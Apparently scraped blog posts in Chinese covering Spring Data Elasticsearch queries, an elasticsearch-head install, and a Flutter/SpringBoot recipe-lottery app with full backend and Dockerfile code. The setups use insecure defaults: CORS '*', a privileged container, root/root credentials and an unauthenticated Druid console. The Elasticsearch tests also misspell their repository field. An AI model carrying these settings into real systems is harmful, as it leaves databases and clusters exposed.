ElasticsearchTemplate template;@Autowiredprivate ProductESRepository repository;// 新增或者覆盖一个文档@Testpublic void testSaveOrUpdate() throws Exception { // 索引库中不存在则新增，存在则覆盖 Product p = new Product(&quot;13&quot;, &quot;华为手环 B5（Android 运动手环）&quot;, 999, &quot;高清彩屏 腕上蓝牙耳机 心率检测 来电消息提醒&quot;, &quot;华为&quot;); repostitory.save(p);}// 删除一个文档@Testpublic void testDelete() throws Exception { repostitory.deleteById(&quot;13&quot;);}// 根据ID查询一个文档@Testpublic void testGet() throws Exception { Optional&lt;Product&gt; optional = repostitory.findById(&quot;1&quot;); optional.ifPresent(System.out::println);}// 查询所有文档@Testpublic void testList() throws Exception { Iterable&lt;Product&gt; iter = repostitory.findAll(); iter.forEach(System.out::println);}// 分页查询文档按照价格降序排列，显示第2页，每页显示3个@Testpublic void testQuery1() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); // 设置分页信息 builder.withPageable(PageRequest.of(1, 3)); // 设置排序信息 builder.withSort(SortBuilders.fieldSort(&quot;price&quot;).order(SortOrder.DESC)); Page&lt;Product&gt; page = repostitory.search(builder.build()); System.out.println(page.getTotalElements()); //总记录数 System.out.println(page.getTotalPages()); //总页数 page.forEach(System.out::println);}// 查询商品标题中符合&quot;游戏 手机&quot;的字样的商品@Testpublic void testQuery2() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.matchQuery(&quot;title&quot;, &quot;游戏 手机&quot;) ); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 查询商品价格等于15299的商品@Testpublic void testQuery3() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.termQuery(&quot;price&quot;, 15299) ); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 查询商品价格在5000~9000之间商品，按照价格升序排列@Testpublic void testQuery4() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.rangeQuery(&quot;price&quot;) .gte(5000).lte(9000) ); builder.withSort(SortBuilders.fieldSort(&quot;price&quot;).order(SortOrder.ASC)); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品@Testpublic void testQuery5() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.multiMatchQuery(&quot;蓝牙 指纹 双卡&quot;, &quot;title&quot;, &quot;intro&quot;) ); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品@Testpublic void testQuery6() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.boolQuery() .must(QueryBuilders.matchQuery(&quot;title&quot;, &quot;i7&quot;)) .must(QueryBuilders.rangeQuery(&quot;price&quot;).gt(7000)) ); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品@Testpublic void testQuery7() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.withQuery( QueryBuilders.boolQuery() .should(QueryBuilders.matchQuery(&quot;title&quot;, &quot;pro&quot;)) .should(QueryBuilders.rangeQuery(&quot;price&quot;).gte(1000).lte(3000)) ); Page&lt;Product&gt; page = repostitory.search(builder.build()); page.forEach(System.out::println);}// 按照品牌分组，统计各品牌的数量@Testpublic void testQuery8() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.addAggregation( AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;) ); AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build()); // 获取自定义的分组字段 StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;); brand.getBuckets().forEach(bucket -&gt; System.out.println(bucket.getDocCount()));}// 按照品牌分组，统计各品牌的平均价格@Testpublic void testQuery9() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.addAggregation( AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;) .subAggregation(AggregationBuilders.avg(&quot;avgPrice&quot;).field(&quot;price&quot;)) ); AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build()); // 获取自定义的分组字段 StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;); brand.getBuckets().forEach(bucket -&gt; { InternalAvg avgPrice = bucket.getAggregations().get(&quot;avgPrice&quot;); System.out.println(avgPrice.getValue()); });}// 按照品牌分组，统计各品牌的价格数据@Testpublic void testQuery10() throws Exception { NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); builder.addAggregation( AggregationBuilders.terms(&quot;groupByBrand&quot;).field(&quot;brand&quot;) .subAggregation(AggregationBuilders.stats(&quot;statsPrice&quot;).field(&quot;price&quot;)) ); AggregatedPage&lt;Product&gt; page = (AggregatedPage&lt;Product&gt;) repostitory.search(builder.build()); // 获取自定义的分组字段 StringTerms brand = (StringTerms) page.getAggregation(&quot;groupByBrand&quot;); brand.getBuckets().forEach(bucket -&gt; { InternalStats statsPrice = bucket.getAggregations().get(&quot;statsPrice&quot;); System.out.println(statsPrice.getSumAsString()); System.out.println(statsPrice.getAvgAsString()); System.out.println(statsPrice.getMaxAsString()); System.out.println(statsPrice.getMinAsString()); System.out.println(statsPrice.getCount()); System.out.println(&quot;-----------------------&quot;); });}// 查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示@Testpublic void testHighlight() throws Exception { // Java与JSON互转的工具对象 ObjectMapper mapper = new ObjectMapper(); NativeSearchQueryBuilder builder = new NativeSearchQueryBuilder(); // 设置查询哪个索引中的哪个类型 builder.withIndices(&quot;shop_product&quot;).withTypes(&quot;shop_product&quot;); builder.withQuery( QueryBuilders.multiMatchQuery(&quot;蓝牙 指纹 双卡&quot;, &quot;title&quot;, &quot;intro&quot;) ); builder.withHighlightFields( new HighlightBuilder.Field(&quot;title&quot;) .preTags(&quot;&lt;span style='color:red'&gt;&quot;).postTags(&quot;&lt;/span&gt;&quot;), new HighlightBuilder.Field(&quot;intro&quot;) .preTags(&quot;&lt;span style='color:red'&gt;&quot;).postTags(&quot;&lt;/span&gt;&quot;) ); AggregatedPage&lt;Product&gt; page = template.queryForPage(builder.build(), Product.class, new SearchResultMapper() { public &lt;T&gt; AggregatedPage&lt;T&gt; mapResults(SearchResponse resp, Class&lt;T&gt; clazz, Pageable pageable) { List&lt;T&gt; list = new ArrayList&lt;&gt;(); try { for (SearchHit hit : resp.getHits().getHits()) { // 把查询到的JSON字符串转换成Java对象 T t = mapper.readValue(hit.getSourceAsString(), clazz); for (HighlightField field : hit.getHighlightFields().values()) { // 替换需要高亮显示的字段，用到Apache的BeanUtils工具 BeanUtils.setProperty(t, field.getName(), field.getFragments()[0].string()); } list.add(t); } } catch (Exception e) { e.printStackTrace(); return null; } long total = resp.getHits().totalHits; return new AggregatedPageImpl&lt;&gt;(list, pageable, total); } }); page.forEach(System.out::println);} # springboot2.3.x 以上配置 配置关系对应 pom 相同 配置 1234567## 旧版本以spring.data.elasticsearch.开头;访问地址配置不用声明访问协议,监听es的tcp端口#spring.data.elasticsearch.cluster-nodes=localhost:9300#spring.data.elasticsearch.cluster-name=elasticsearch## 新版本以spring.elasticsearch.rest.开头;访问地址配置需要声明访问协议,直接监听es访问端口spring.elasticsearch.rest.uris=http://localhost:9200spring.elasticsearch.rest.username=elasticsearch 使用 旧版的核心访问对象是 ElasticsearchTemplate；新版的核心访问对象是 ElasticsearchRestTemplate； 实体类没有类型 12// @Document指定当前类是索引对象。indexName:索引名称;shards:创建索引时的分片数;replicas:创建索引时的备份数@Document(indexName = &quot;book_&quot;, shards = 5, replicas = 1) # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/03/28/%E3%80%90Elasticsearch%E3%80%91Elasticsearch/"},{"title":"Linux环境下安装并启动Elasticsearch-head","text":"# 1、elasticsearch-head 介绍 官方地址: https://github.com/mobz/elasticsearch-head elasticsearch-head 是一款用来管理 Elasticsearch 集群的第三方插件工具。 elasticsearch-Head 插件在 5.0 版本之前可以直接以插件的形式直接安装，但是 5.0 以后安装方式发生了改变，需要 nodejs 环境支持，或者直接使用别人封装好的 docker 镜像，更推荐的是谷歌浏览器的插件。 # 2、elasticsearch-head 安装 # npm 安装 elasticsearch-head 12345678910111213141516171819202122#下载安装nodejswget https://nodejs.org/dist/v12.13.0/node-v12.13.0-linux-x64.tar.xztar xf node-v12.13.0-linux-x64.tar.xzmv node-v12.13.0-linux-x64 node#修改环境变量echo 'export PATH=$PATH:/opt/node/bin' &gt;&gt; /etc/profile#配置生效source /etc/profilenpm -vnode -v#下载elasticsearch-headgit clone git://github.com/mobz/elasticsearch-head.git#进入elasticsearch-head安装目录cd elasticsearch-head#配置国内镜像npm install -g cnpm --registry=https://registry.npm.taobao.org#安装cnpm install#启动cnpm run start 修改 Elasticsearch 配置文件，添加如下参数并重启: 123#准许es被跨域访问http.cors.enabled: truehttp.cors.allow-origin: &quot;*&quot; # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2021/10/03/%E3%80%90Elasticsearch%E3%80%91Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%AE%89%E8%A3%85%E5%B9%B6%E5%90%AF%E5%8A%A8Elasticsearch-head/"},{"title":"如何使用Flutter+SpringBoot+Mysql开发一个简易的抽奖APP（Android教学","text":"# 微信公众号搜索 InterviewCoder 回复关键词《吃啥》获取源码以及开发教程～ # 前言： # Weat 中文译为：吃啥 # 吃啥来自于女朋友的一个问题，问我可不可以做个抽奖的 APP，奖品都是菜，抽中那个今天就做那个菜吃，我灵机一动，使用 InterviewCoder 公众号里面的 chatGPT 小程序编辑了下面的文案： # 吃啥是一款新奇有趣的应用，旨在帮助你找到今天吃什么菜。它通过精心的菜谱抽奖模式，为你提供多样而有色彩的食物，让你的用餐经历变得更加美好。不仅如此，它还可以添加朋友和家人的偏好，为大家带来更多惊喜。加入吃啥，让你的用餐经历变得更加完美！ # 架构方面： 移动端：Flutter 后台服务：SpringBoot、Mysql # 没有安装 dart、flutter、Android Studio、vscode 的同学可以看看以前的教程，这里就不 一 一 介绍了 本文将详细介绍 weatapp 的开发流程，前后端代码编写阶段，以及后台代码部署。 # 一、APP 创建： 打开项目路径，输入 cmd 进入到命令行，输入 flutter create weat 进行 flutter 项目创建。 打开 Android Studio 整理项目，修改仓库配置 123maven { url 'https://maven.aliyun.com/repository/google' }maven { url 'https://maven.aliyun.com/repository/jcenter' }maven { url 'http://maven.aliyun.com/nexus/content/groups/public' } 3. 点击 Open for Editing in Android Studio 进入安卓视图，拉取 gradle 库 4. 当 Android 主文件不暴红，说明配置完毕了，gradle 库已经拉下来了 # 二、APP 启动： ​ 1. 打开一个安卓模拟器，有条件的同学可以直接使用真机，老师这里为了方便就直接用模拟器了 ​ 2. 使用 vscode 打开项目并启动 flutter 项目 至此，一个 flutter 项目，创建完成，并启动了！ # 三、APP 图标配置 需要打开两个网址： https://logo.aliyun.com/logo#/name 阿里云 LOGO 服务 https://icon.wuruihong.com/ 图标工厂 1. 打开阿里云 LOGO 输入 APP 名字，吃啥 2. 生成图标： 购买一个你喜欢的图标，如果不购买的话，自己在网上找一个也行，但是一定要有商业授权！ 得到图标后，进入图标工厂，生成一套 ios 和一套 Android 的图标文件： 进入安卓文件夹，将该目录的文件复制到你的项目下面 \\android\\app\\src\\main\\res # 成效： 至此，APP 图标设置完成！ # 四、APP 后台开发（SpringBoot+Mysql） # 为什么先开发 APP 部分？，这个纯属个人习惯，我比较喜欢先有数据和接口，直接开发 APP 的感觉会更轻松！ # 整理需求： 12每次进入app随机获取食物列表点击开始抽奖 随机跳转 点击停止 按钮回显食物名称 点击查看菜谱 弹窗提示做法 根据如上需求，我明确了客户到底想要什么 1. 这是一个服务类型的 APP，服务于不知道吃什么的客户 2. 每次进入抽奖页面需要获取不同的菜谱奖品列表 3. 这个页面需要有个按钮，可以来重置奖品，并且要限制次数 4. 点击抽奖按钮，开始抽奖，再次点击，或者超过限制时间，停止选择，并将按钮置为：查看食谱 5. 点击查看食谱，进入食谱详情，展示过程 根据我的聪明思考，画出了如下 UI： # 开玩笑，画的很烂，但是就是这个意思！。 那么，开始开发后台数据，为我们的 APP 提供一个接口～！ 经过一系列操作，得到以下数据： 1234567891011121314151617181920212223242526272829SET NAMES utf8mb4;SET FOREIGN_KEY_CHECKS = 0;-- ------------------------------ Table structure for iv_dishes-- ----------------------------DROP TABLE IF EXISTS `iv_dishes`;CREATE TABLE `iv_dishes` ( `id` int(50) NOT NULL AUTO_INCREMENT COMMENT '唯一ID', `dishes_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '菜品名字', `dishes_step` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '菜品做法', `dishes_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '菜品图片地址', PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '菜品表' ROW_FORMAT = Compact;-- ------------------------------ Records of iv_dishes-- ----------------------------INSERT INTO `iv_dishes` VALUES (1, '凉拌黄瓜虾仁', '1.小米辣 白芝麻蒜未辣椒面 淋上少许热油\\r\\n2.生抽2勺 油 醋各1代糖半勺搅匀备用\\r\\n3.虾煮熟去壳 木耳焯水捞出 黄瓜拍块\\r\\n4.淋上酱汁拌匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224081935481.png');INSERT INTO `iv_dishes` VALUES (2, '低卡酱油鸡蛋', '1.生抽4勺 醋2香油1勺一把葱花\\r\\n2.鸡蛋冷水下锅煮8分钟盖盖焖1分钟后泡冷水\\r\\n3.温开水4勺搅匀\\r\\n4.鸡蛋剥壳切对半淋上酱汁拌匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082035768.png');INSERT INTO `iv_dishes` VALUES (3, '低卡葱香鸡腿', '1.蒜末 葱花 白艺麻小米辣淋上少许热油\\r\\n2.生抽1勺 许盐搅匀\\r\\n3.鸡腿熟捞出微凉后撕成小块\\r\\n4.淋上酱汁拌匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082101091.png');INSERT INTO `iv_dishes` VALUES (4, '低卡平菇炒蛋', '1.鸡蛋炒熟盛出\\r\\n2.油热下从蒜炒香\\r\\n3.下平菇炒出汁，倒入炒好的鸡蛋\\r\\n4.生抽 油 辣椒粉各1勺 少许盐炒匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082137439.png');INSERT INTO `iv_dishes` VALUES (5, '凉拌虾仁西兰花', '1.蒜未 葱花 辣椒面白芝麻淋上少许热油\\r\\n2.生抽2勺 醋各1勺搅拌均匀\\r\\n3.西兰花焯水捞出，虾焯水去壳鸡蛋白切块\\r\\n4.淋上酱汁拌匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082204322.png');INSERT INTO `iv_dishes` VALUES (6, '凉拌黄瓜木耳鸡蛋', '1.木耳鸡蛋各煮熟捞出 黄瓜拍块\\r\\n2.生抽2勺醋香油各11勺温开水拌匀即可开吃', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082230282.png');INSERT INTO `iv_dishes` VALUES (7, '凉拌黄瓜豆腐', '1.白芝麻辣椒面小米辣,蒜未 葱花 淋少许热油\\r\\n2.生抽2勺 醋油各1勺 少许盐代糖拌匀\\r\\n3.黄瓜拍块去籽豆腐煮熟捞出\\r\\n4.撒上香葱淋上酱汁拌匀即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082404878.png');INSERT INTO `iv_dishes` VALUES (8, '木耳炒鸡蛋', '1.鸡蛋炒熟盛出\\r\\n2.蒜未和胡萝人炒软倒木耳炒熟再倒鸡蛋\\r\\n3.耗油生抽各1勺少许盐-小半碗淀粉水\\r\\n4.炒匀下葱段即可', 'https://brath.oss-cn-shanghai.aliyuncs.com/pigo/image-20230224082512562.png');SET FOREIGN_KEY_CHECKS = 1; 接下来创建一个 SpringBoot 项目，并写出 entity、 controller、service、impl、mapper、xml 等需要的代码 entity： 1234567891011121314151617181920212223242526272829/** * &lt;p&gt; * 菜品表 * &lt;/p&gt; * * @author Brath * @since 2023-02-23 */@Data@EqualsAndHashCode(callSuper = false)@TableName(&quot;iv_dishes&quot;)@ApiModel(value=&quot;IvDishes对象&quot;, description=&quot;菜品表&quot;)public class IvDishes implements Serializable { private static final long serialVersionUID = 1L; @ApiModelProperty(value = &quot;唯一ID&quot;) @TableId(value = &quot;id&quot;, type = IdType.AUTO) private Integer id; @ApiModelProperty(value = &quot;菜品名字&quot;) private String dishesName; @ApiModelProperty(value = &quot;菜品做法&quot;) private String dishesStep; @ApiModelProperty(value = &quot;菜品图片地址&quot;) private String dishesUrl;} controller： 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * &lt;p&gt; * 菜品表 前端控制器 * &lt;/p&gt; * * @author Brath * @since 2023-02-23 */@RestController@RequestMapping(&quot;/dishes&quot;)public class IvDishesController { /*** * SLF4J日志 */ private Logger logger = LoggerFactory.getLogger(IvDishesController.class); /** * 菜品服务接口 */ @Autowired private IvDishesService dishesService; /*** * 获取菜品列表 * * @param page * @param size * @return */ @GetMapping(&quot;/getDishes&quot;) public Object getDishes(@RequestParam(value = &quot;page&quot;, defaultValue = &quot;1&quot;) Integer page, @RequestParam(value = &quot;size&quot;, defaultValue = &quot;8&quot;) Integer size) { logger.info(&quot;【用户服务】获取菜品列表,开始&quot;); Map&lt;Object, Object&gt; result = new HashMap&lt;&gt;(); IPage&lt;IvDishes&gt; prizeRecords = dishesService.getDishes(page, size); if (CollectionUtils.isEmpty(prizeRecords.getRecords())) { result.put(&quot;fail&quot;, ResponseCode.DATA_DOES_NOT_EXIST); logger.error(&quot;【用户服务】获取菜品列表,服务错误:{}&quot;, ResponseCode.DATA_DOES_NOT_EXIST); } result.put(&quot;prizeRecords&quot;, prizeRecords.getRecords()); logger.info(&quot;【用户服务】获取菜品列表,完毕&quot;); return ResponseUtil.ok(result); }} service： 1234567891011121314151617181920/** * &lt;p&gt; * 菜品表 服务类 * &lt;/p&gt; * * @author Brath * @since 2023-02-23 */public interface IvDishesService extends IService&lt;IvDishes&gt; { /** * 获取菜品列表 * * @param page * @param size * @return */ IPage&lt;IvDishes&gt; getDishes(Integer page, Integer size);} impl： 1234567891011121314151617181920212223/** * &lt;p&gt; * 菜品表 服务实现类 * &lt;/p&gt; * * @author Brath * @since 2023-02-23 */@Servicepublic class IvDishesServiceImpl extends ServiceImpl&lt;IvDishesMapper, IvDishes&gt; implements IvDishesService { /** * 获取菜品列表 * * @param page * @param size * @return */ @Override public IPage&lt;IvDishes&gt; getDishes(Integer page, Integer size) { return baseMapper.getDishes(new Page&lt;&gt;(page, size), new QueryWrapper&lt;&gt;()); }} mapper： 123456789101112131415161718192021/** * &lt;p&gt; * 菜品表 Mapper 接口 * &lt;/p&gt; * * @author Brath * @since 2023-02-23 */@Mapperpublic interface IvDishesMapper extends BaseMapper&lt;IvDishes&gt; { /** * 获取菜品列表 * * @param objectPage * @param objectQueryWrapper * @return */ IPage&lt;IvDishes&gt; getDishes(Page&lt;Object&gt; objectPage, QueryWrapper&lt;Object&gt; objectQueryWrapper);} xml： 123456789101112131415161718&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;cn.brath.mapper.IvDishesMapper&quot;&gt; &lt;!-- 通用查询映射结果 --&gt; &lt;resultMap id=&quot;DishesMap&quot; type=&quot;cn.brath.entity.IvDishes&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt; &lt;result column=&quot;dishes_name&quot; property=&quot;dishesName&quot;/&gt; &lt;result column=&quot;dishes_step&quot; property=&quot;dishesStep&quot;/&gt; &lt;result column=&quot;dishes_url&quot; property=&quot;dishesUrl&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getDishes&quot; resultType=&quot;cn.brath.entity.IvDishes&quot;&gt; select d.* from iv_dishes d ORDER BY RAND() &lt;/select&gt;&lt;/mapper&gt; application.yaml 配置： 123456789101112131415161718192021222324252627282930313233343536server: port: 9999spring: datasource: druid: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/iv-user-services?createDatabaseIfNotExist=true&amp;useSSL=false&amp;useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&amp;nullCatalogMeansCurrent=true username: 'root' password: 'root' initial-size: 10 max-active: 100 min-idle: 10 max-wait: 6000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 20 time-between-eviction-runs-millis: 60000 min-evictable-idle-time-millis: 300000 #Oracle需要打开注释 # validation-query: SELECT 1 FROM DUAL test-while-idle: true test-on-borrow: false test-on-return: false stat-view-servlet: enabled: true url-pattern: /druid/* #login-username: admin #login-password: admin #达梦数据库，需要注释掉，其他数据库可以打开 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true 经过如上一系列配置，我们项目启动成功并可以访问到接口： 接下来只要把程序部署上线就搞定了！ 部署后台程序： 将我们的 Dockerfile、运行脚本、jar 包传入服务器 Dockerfile: 1234567891011121314151617181920212223242526#java8环境FROM openkbs/jdk11-mvn-py3#root用户USER root#设置时区ENV TZ=Asia/ShanghaiRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone#AuthMAINTAINER Brath#设置工作目录集WORKDIR /root/weatWork#复制jars和命令ADD *.jar /root/weatWork/ADD run.sh /root/weatWork/run.sh#脚本权限设置RUN chmod +x /root/weatWork/run.sh#暴露端口EXPOSE 9999 # 1.Dockerfile 打包镜像 121.进入工作目录2.docker build -t weat . # 2. 运行容器 1docker run -dit -p 9999:9999 --privileged=true -P --name weat weat /bin/bash -c &quot;tail -f /dev/null&quot; -g &quot;daemon off;&quot; # 3. 启动 Jar 包 123456#进入容器docker exec -it weat bash#运行脚本sh run.sh#查看日志tail -100f weatlog.log # 4. 联调接口 # 五、APP 移动端开发（Flutter） # weatApp 架构设计大概如下： 12345678910111213lib:​ common 通用层​ core 核心层​ routers 路由曾​ utils 工具层​ viewmodel 视图模型层​ views 视图层 需要安装的依赖： 123456789101112131415161718192021222324#网络请求dio: ^4.0.6#getx get: ^4.6.5#透明弹出框fluttertoast: ^8.0.8#屏幕适配flutter_screenutil: ^5.5.3+2#全局状态管理provider: ^6.0.1#轮播图flutter_swiper_plus: ^2.0.4# GET WIDGET UI库getwidget: ^2.0.5#图片缓存cached_network_image: ^3.2.0#图片放大缩小photo_view: ^0.13.0#权限申请permission_handler: ^9.2.0#贝壳组件库bruno: ^2.2.0#easyloadingflutter_easyloading: ^3.0.3 # 代码如下： # common.dart 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import 'dart:io';import 'dart:math';import 'package:bruno/bruno.dart';import 'package:flutter/material.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';import 'package:get/get.dart';import 'package:getwidget/getwidget.dart';import 'package:provider/provider.dart';import 'package:weat/main.dart';/* * Common组件库 * @Auth: Brath *//* * 获取title的AppBar */AppBar getAppBar(String title, {required context}) { return AppBar( toolbarHeight: 40.0.h, centerTitle: true, shadowColor: Color.fromARGB(255, 59, 82, 76), backgroundColor: Colors.transparent, leading: null, leadingWidth: 30.w, elevation: 0.0, actions: [], title: (Text( title, style: TextStyle( fontSize: 16.sp, color: Colors.black, fontFamily: '', fontWeight: FontWeight.bold), )));}/* * 获取卡片圆形背景容器 */class getCardContainer extends StatelessWidget { getCardContainer({ Key? key, this.isBorder, this.BorderCircular, this.width, this.height, this.widget, this.margin, }) : super(key: key); bool? isBorder; double? BorderCircular; double? height; double? width; Widget? widget; EdgeInsetsGeometry? margin; @override Widget build(BuildContext context) { return Container( margin: margin, decoration: isBorder == true ? BoxDecoration( color: Colors.white, shape: BoxShape.rectangle, boxShadow: [ BoxShadow( color: Colors.grey[200]!, offset: Offset(1.w, 1.h), blurRadius: 1.r, spreadRadius: 1.r, ), ], border: Border.all(color: Colors.white, width: 1.w), // border borderRadius: BorderRadius.circular((BorderCircular ?? 15.r)), // 圆角 ) : null, width: width, height: height, child: widget, ); }} # ZoomImage.dart 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180import 'dart:ui';import 'package:flutter/material.dart';import 'package:flutter/services.dart';import 'package:flutter_screenutil/flutter_screenutil.dart';class ZoomImage extends StatefulWidget { ZoomImage({Key? key, this.url}) : super(key: key); String? url; @override State&lt;StatefulWidget&gt; createState() { return _ZoomImage(); }}class _ZoomImage extends State&lt;ZoomImage&gt; with SingleTickerProviderStateMixin { AnimationController? _controller; Animation&lt;Offset&gt;? _animation; Offset _offset = Offset.zero; double _scale = 1.0; Offset? _normalizedOffset; double? _previousScale; final double _kMinFlingVelocity = 600.0; bool _isEnlarge = false; bool _isHideTitleBar = false; @override void initState() { super.initState(); _controller = AnimationController(vsync: this); _controller?.addListener(() { setState(() { _offset = _animation!.value; }); }); } @override void dispose() { super.dispose(); _controller!.dispose(); } Offset _clampOffset(Offset offset) { final Size size = context.size!; // widget的屏幕宽度 final Offset minOffset = Offset(size.width, size.height) * (1.0 - _scale); // 限制他的最小尺寸 return Offset( offset.dx.clamp(minOffset.dx, 0.0), offset.dy.clamp(minOffset.dy, 0.0)); } _handleOnScaleStart(ScaleStartDetails details) { setState(() { _isHideTitleBar = true; _previousScale = _scale; _normalizedOffset = (details.focalPoint - _offset) / _scale; // 计算图片放大后的位置 _controller!.stop(); }); } _handleOnScaleUpdate(ScaleUpdateDetails details) { setState(() { _scale = (_previousScale! * details.scale).clamp(1.0, 3.0); // 限制放大倍数 1~3倍 _offset = _clampOffset(details.focalPoint - _normalizedOffset! * _scale); // 更新当前位置 }); } _handleOnScaleEnd(ScaleEndDetails details) { _setSystemUi(); final double magnitude = details.velocity.pixelsPerSecond.distanceSquared; if (magnitude &lt; _kMinFlingVelocity) return; final Offset direction = details.velocity.pixelsPerSecond / magnitude; // 计算当前的方向 final double distance = (Offset.zero &amp; context.size!).shortestSide; // 计算放大倍速，并相应的放大宽和高，比如原来是600*480的图片，放大后倍数为1.25倍时，宽和高是同时变化的 _animation = _controller!.drive(Tween&lt;Offset&gt;( begin: _offset, end: _clampOffset(_offset + direction * distance))); _controller! ..value = 0.0 ..fling(velocity: magnitude / 1000.0); } _onDoubleTap() { _isHideTitleBar = true; _setSystemUi(); Size size = context.size!; _isEnlarge = !_isEnlarge; setState(() { if (!_isEnlarge) { _scale = 2.0; _offset = Offset(-(size.width / 2), -(size.height / 2)); } else { _scale = 1.0; _offset = Offset.zero; } }); } _onTap() { setState(() { _isHideTitleBar = !_isHideTitleBar; }); _setSystemUi(); } @override Widget build(BuildContext context) { return Stack( children: [_bodyView(), _titleBar()], ); } _bodyView() { return GestureDetector( onScaleStart: _handleOnScaleStart, onScaleUpdate: _handleOnScaleUpdate, onScaleEnd: _handleOnScaleEnd, onDoubleTap: _onDoubleTap, onTap: _onTap, child: Container( color: _isHideTitleBar ? Colors.black : Colors.white, child: SizedBox.expand( child: ClipRect( child: Transform( transform: Matrix4.identity() ..translate(_offset.dx, _offset.dy) ..scale(_scale), child: Column( mainAxisAlignment: MainAxisAlignment.center, children: [ SizedBox( width: 700.0.w, height: 600.0.h, child: Image.network(widget.url!)), Container() ], ), ), ), ), ), ); } _titleBar() { return Offstage( child: Container( alignment: Alignment.centerLeft, padding: EdgeInsets.only( top: MediaQueryData.fromWindow(window).padding.top, left: ScreenUtil().setWidth(24)), color: const Color.fromARGB(255, 32, 32, 32), height: MediaQuery.of(context).size.height * 0.1, width: MediaQuery.of(context).size.width, child: GestureDetector( child: Icon( Icons.arrow_back, size: 30.0.w, color: Colors.white, ), onTap: () { Navigator.pop(context); }, ), ), offstage: _isHideTitleBar, ); } _setSystemUi() { if (_isHideTitleBar) { SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge); } else { SystemChrome.setEnabledSystemUIMode(SystemUiMode.manual); } }} # Global.dart 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import 'package:dio/dio.dart';class Global { static String BaseUrl = 'http://127.0.0.1:9999/'; /*请求dio对象 */ late Dio dio; /*通用超时 */ int timeOut = 50000; /*请求单例 */ static Global? _instance; /*获取实例 */ 